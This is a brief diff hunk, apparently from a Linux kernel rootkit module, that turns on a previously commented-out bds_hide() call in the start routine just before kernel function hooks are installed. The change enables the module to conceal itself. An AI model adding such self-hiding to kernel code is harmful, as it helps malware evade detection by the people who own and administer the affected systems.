@@ -35,7 +35,7 @@ responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*
 static int bds_start(void) {
 	int err;
 	
-	//bds_hide();
+	bds_hide();
         
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	
